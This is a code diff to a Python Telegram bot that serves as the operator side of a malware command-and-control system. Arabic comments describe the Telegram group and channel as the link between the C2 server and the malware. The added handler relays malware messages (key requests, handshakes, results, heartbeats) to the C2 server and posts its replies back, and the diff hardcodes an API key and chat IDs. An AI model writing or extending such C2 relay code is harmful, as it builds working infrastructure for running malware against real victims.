@@ -33,6 +33,11 @@ C2_URL              = os.environ.get("C2_SERVER_URL", "http://localhost:5000")
 C2_KEY              = os.environ.get("C2_API_KEY",    "c2_super_secret_key_2026_123456")
 C2_HEADERS          = {"X-API-Key": C2_KEY, "Content-Type": "application/json"}
 
+# قناة وجروب التيليجرام الخاصين بتواصل C2 ↔ Malware
+C2_GROUP_ID   = "-1002470378114"
+C2_CHANNEL_ID = "-1002426552780"
+_C2_PREFIXES  = ("KEY_REQUEST:", "HANDSHAKE:", "RESULT:", "HEARTBEAT:")
+
 # Per-chat session: { chat_id: {"client": str|None, "sudo": bool} }
 _sessions: dict[int, dict] = {}
 
@@ -352,6 +357,34 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
+async def handle_c2_group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    يستقبل رسائل المالوير من الجروب ويحولها لـ c2_server.
+    bot.py هو الوحيد اللي بيعمل polling — كده مفيش تعارض على الـ updates.
+    """
+    if not update.message or not update.message.text:
+        return
+    if str(update.effective_chat.id) != C2_GROUP_ID:
+        return
+
+    text = update.message.text.strip()
+    if not any(text.startswith(p) for p in _C2_PREFIXES):
+        return
+
+    try:
+        r = requests.post(
+            f"{C2_URL}/internal/tg_message",
+            json={"text": text},
+            headers=C2_HEADERS,
+            timeout=10,
+        )
+        reply = r.json().get("reply")
+        if reply:
+            await context.bot.send_message(chat_id=int(C2_CHANNEL_ID), text=reply)
+    except Exception as e:
+        print(f"[C2 group handler] error: {e}")
+
+
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     if not _allowed(chat_id):
@@ -410,6 +443,11 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("history", cmd_history))
     app.add_handler(MessageHandler(filters.PHOTO,        handle_photo))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+    # رسائل الجروب الخاصة بالمالوير — أولوية عالية قبل handle_text
+    app.add_handler(MessageHandler(
+        filters.TEXT & filters.Chat(chat_id=int(C2_GROUP_ID)),
+        handle_c2_group_message,
+    ), group=0)
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.add_error_handler(error_handler)
 
